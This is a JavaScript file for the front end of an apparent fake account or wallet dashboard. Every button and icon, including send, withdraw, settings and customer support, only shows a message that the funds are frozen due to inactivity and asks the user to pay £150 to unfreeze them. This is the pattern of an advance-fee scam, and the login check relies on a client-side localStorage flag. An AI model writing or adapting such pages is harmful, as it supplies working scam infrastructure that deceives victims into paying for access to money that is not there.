// Check authentication
const isLoggedIn = localStorage.getItem('isLoggedIn');
if (!isLoggedIn) {
    window.location.href = 'index.html';
}

// Display user email
document.getElementById('userEmail').textContent = localStorage.getItem('userEmail');

// Function to show popup message
function showFrozenMessage() {
    const popup = document.getElementById('messagePopup');
    popup.style.display = 'flex';
}

// Function to close popup
window.closePopup = function() {
    const popup = document.getElementById('messagePopup');
    popup.style.display = 'none';
}

// Send button click handler
document.getElementById('sendBtn').addEventListener('click', function() {
    showFrozenMessage();
});

// Withdraw button click handler
document.getElementById('withdrawBtn').addEventListener('click', function() {
    showFrozenMessage();
});

// NEW: Icon click handlers with demo messages
document.getElementById('profileIcon').addEventListener('click', function() {
    alert('📱 Profile Page (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and access profile features.');
});

document.getElementById('settingsIcon').addEventListener('click', function() {
    alert('⚙️ Settings (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and change settings.');
});

document.getElementById('csIcon').addEventListener('click', function() {
    alert('💬 Customer Support (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and contact support.');
});

document.getElementById('chartIcon').addEventListener('click', function() {
    alert('📊 Analytics Dashboard (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and view charts.');
});

// Logout functionality
document.getElementById('logoutBtn').addEventListener('click', function() {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('userEmail');
    window.location.href = 'index.html';
});

// Close popup when clicking outside
window.onclick = function(event) {
    const popup = document.getElementById('messagePopup');
    if (event.target === popup) {
        popup.style.display = 'none';
    }
}
